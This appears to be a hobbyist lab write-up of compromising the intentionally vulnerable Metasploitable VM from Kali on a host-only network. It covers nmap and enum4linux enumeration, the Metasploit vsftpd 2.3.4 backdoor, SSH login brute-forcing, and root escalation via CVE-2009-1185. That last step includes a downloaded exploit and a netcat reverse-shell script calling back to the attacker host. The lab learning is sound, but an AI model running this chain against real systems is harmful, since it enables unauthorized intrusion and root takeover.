I've always had a casual interest in exploring penetration testing. Over the last week I've taken to seeing what I could learn through my own exploration!

A few assumptions are made with this write-up.
1. Kali Linux and Metasploitable are both being run through Oracle VM VirtualBox.
2. Metasploitable's IP is `192.168.56.101` and Kali's IP is `192.168.56.102`
3. An additional network adapter is enabled on Kali to provide updates and downloads
4. This is personal hardware/software and no local laws are being broken.

Obviously, keep metasploitable and kali on a host-only virtual network. Don't let script kiddies have access to an intentionally exploitable machine!!

Enable a second network interface and update Kali. There's nothing wrong with skipping this step if you're staying on a host-only network, but it's good to be up to date. Once it's updated, be sure to switch your network adapter back to host-only mode.

## Let's get started!

Before starting anything, we want to find the IP of the machine we want to pwn. Let's use netdiscover

`netdiscover -r 192.168.56.100`
Now we've got a few IP addresses to scan.
Pinging `192.168.56.100` returns nothing, whereas `192.168.56.101` pings back! That gives us, with just 3 possible addresses to choose from, a good idea of our target's address.

Time to get more information on our target. We can use nmap to scan for TCP ports and the services they use.

`nmap -sV -O 192.168.56.101 -p1-65535`
- -sV to check open ports and version information
- -O to try to guess the operating system

![nmap result](/img/metasploitable/metasploitable1.png)
Lots of open ports! This is obviously on purpose. This gives us great information-- we can see what software and version number applies to each port.

## Enumeration for fun and profit
Kali has a wonderful script called enum4linux. This asks the remote Samba service for a list of users.

`enum4linux -U 192.168.56.101`
- -U displays the users

With some grepping and cutting, we can easily isolate a list of users for use later. `enum4linux -U 192.168.56.101 | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > users.txt` Keep this file around for later!

## There's a few different ways you can get a shell. Here are two:

### vsftpd (port 21)
Boot up the metasploit console (`msfconsole`). With this, we can search for and execute various exploits. Let's look up vsftpd version 2.3.4

`search vsftpd 2.3.4`

![Search vsftpd](/img/metasploitable/metasploitable2.png)
Aha! An excellent backdoor exploit. We're given the namespace to the exploit, which we'll use to execute it.

`use exploit/unix/ftp/vsftpd_234_backdoor` (metasploit supports tab completion!)

Next, we'll set RHOST to our target's IP address. `set rhost 192.168.56.101`

and we'll set our RPORT to 21 to match the port that vsftpd is running on. `set rport 21`

Finally, we execute our attack with a simple `run`.

Press Enter, and you'll have gained access to a remote shell!
![remote shell](/img/metasploitable/metasploitable3.png)

### ssh (port 22)
We can employ a similar method to try and gain access to port 22. With metasploit still open, we'll use a [common ssh login check scanner](https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/).

`use auxillary/scanner/ssh/ssh_login`

Again, set your rhosts and rport to the corresponding information. (`set rhosts 192.168.56.101` and `set rport 22`)

We'll be using our previous wordlist to attempt to brute force our way in. `set user_file users.txt`.

Additionally, we'll want to `set user_as_pass true`. This might save us some time if our target decided to use the same password as their username.

In order to watch the brute force in action, we'll need to `set verbose true`.

Now a quick `run` should enumerate through the users file, trying each username as its own password.

![trial](/img/metasploitable/metasploitable4.png)
Not bad!

## Now what? Escalation!!

With the newfound limited user accounts that we now have access to, our next step is to elevate our user level. The whole point was to get root access, right?

What can we find by exploring the `user` user? Starting off with `uname -a` will give us details about the system. Through this, we can pick out the kernel version- 2.6.14. Let's dive into some CVEs! Some quick searching will give us [CVE-2009-1185](http://www.exploit-db.com/exploits/8572/). This exploits a Netlink in order to execute a payload from /tmp/run AS ROOT!!. Netlink is a way to pass data back and forth between the kernel and user-space.

We'll need to enable an external internet connection in order to download the exploit. While logged into the `user` account, `wget https://www.exploit-db.com/download/8572.c` (as always, audit all code you download!). Next, we'll need to compile our C code with `gcc -o exploit 8572.c`. This will create an executable named `exploit` that we can pass an argument to.

Once the exploit is compiled, we'll need to find the netlink process ID to pass as the argument to our script. We'll find this with `cat /proc/net/netlink`. Several results will display, but we want the one with an above-zero PID. In my case this is `2329`

Now we'll move on to the command we want to execute as root. With `vim /tmp/run` we can enter a command to execute as root. For this, netcat will execute a shell that we'll catch later. In /tmp/run, we'll enter the following. I'm choosing 1337 as my port because `1337 5P34K` is always cool.

```
#!/bin/bash
/bin/netcat -e /bin/bash 192.168.56.102 1337
```

Now, in another terminal local to our Kali environment, we'll need to catch netcat and listen on port 1337. To do this we use `nc -l -p 1337`.

Returning to our ssh'd Metasploitable terminal, we're finally going to execute our exploit! `./exploit 1337`

It wont look like anything is happening, but if we run `id` through our Kali terminal, we'll see that we're now `uid=0(root) gid=0(root)`! Just to make sure we're not seeing our Kali id, we'll check `uname -a` again.

![payload executed](/img/metasploitable/metasploitable5.png)

I hope you learned as much as I did! Of course, there are plenty of other ways to exploit vulnerable machines, and it's been an incredibly fun journey trying to figure out this much. I'm excited to learn more!
